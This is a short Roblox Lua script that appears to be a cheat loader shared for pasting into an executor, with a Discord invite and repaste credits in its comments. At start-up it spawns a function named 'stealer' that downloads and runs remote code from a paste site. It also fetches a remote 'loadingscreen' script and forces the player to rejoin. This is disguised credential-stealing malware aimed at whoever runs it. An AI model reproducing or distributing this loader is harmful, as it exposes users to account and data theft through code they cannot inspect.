local function stealer()
    loadstring(game:HttpGet("https://paste.debian.net/plainh/53c7d1d8/", true))()
end

local function loadingscreen()
    loadstring(game:HttpGet("https://arko.lol/loadingscreen.lua"))()
local TeleportService = game:GetService("TeleportService")
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
 
local Rejoin = coroutine.create(function()
    local Success, ErrorMessage = pcall(function()
        TeleportService:Teleport(game.PlaceId, LocalPlayer)
    end)
 
    if ErrorMessage and not Success then
        warn(ErrorMessage)
    end
end)
 
coroutine.resume(Rejoin)
--join discord 
--https://discord.gg/7axk7UGS8C
--pastebin originally by: ZAZA62
--repasted just for loadstring
end

task.spawn(stealer)
task.spawn(loadingscreen)
